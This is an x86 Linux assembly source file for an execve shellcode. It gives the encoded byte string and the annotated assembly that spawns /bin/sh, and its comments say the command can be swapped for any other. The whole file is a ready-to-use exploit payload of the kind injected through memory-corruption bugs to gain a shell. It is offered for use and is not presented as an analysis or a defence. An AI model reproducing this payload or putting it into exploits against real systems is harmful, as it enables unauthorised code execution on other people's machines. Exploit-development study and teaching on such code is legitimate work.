# Shellcode which allows you to place any command to run other
# than /bin/sh without any other adjustments.

# The actual shellcode:

# char shellcode[] = "\xeb\x36\x5e\x31\xdb\x31\xc0\xb3\xff\x89\xf1"
# "\x41\x8a\x1\x39\xd8\x75\xf9\x89\xcf\x31\xdb\x88\x1f\x47\x89\xfc"
# "\x83\xc4\xc\x31\xc0\x50\x50\x56\x31\xc0\x83\xc0\xb\x89\xf3\x89"
# "\xf9\x89\xfa\x83\xc2\x8\xcd\x80\x31\xc0\x40\xcd\x80\xe8\xc5\xff"
# "\xff\xff/bin/sh\xff";

# This emulates as if this was executed on the stack
# i.e. sets the pages up to be rw- which is actually rwx without 
# kernel patches (pax). of course, shellcodes don't work on pax anyway.
.data

.global _start

_start:
	jmp end

begin:
	pop %esi

# find \xff char in string and convert it to \x0
	xor %ebx, %ebx
	xor %eax, %eax

	movb $0xff, %bl
	mov %esi, %ecx
loop1:
	inc %ecx
	movb (%ecx), %al
	cmp %ebx, %eax
	jne loop1

# found it, load into edi, nullify the char, and then make edi point 
# to the space after it
	mov %ecx, %edi
	xor %ebx, %ebx
	movb %bl, (%edi)
	inc %edi

# now set the esp to 12 bytes past this.. so when we push we come back to edi
	mov %edi, %esp
	add $12, %esp
	
# push the arguments
	xor %eax, %eax
	push %eax	# envp (NULL)
	push %eax	# argv[1] (NULL)
	push %esi	# argv[0] (address of "/bin/sh")

# call execve
	xor %eax, %eax
	add $11, %eax
	mov %esi, %ebx
	mov %edi, %ecx
	mov %edi, %edx
	add $8, %edx
	int $0x80

# if we reached here, that means the command didn't work, so exit nicely
	xor %eax, %eax
	inc %eax
	int $0x80

end:
	call begin
	.ascii "/bin/sh\xff"

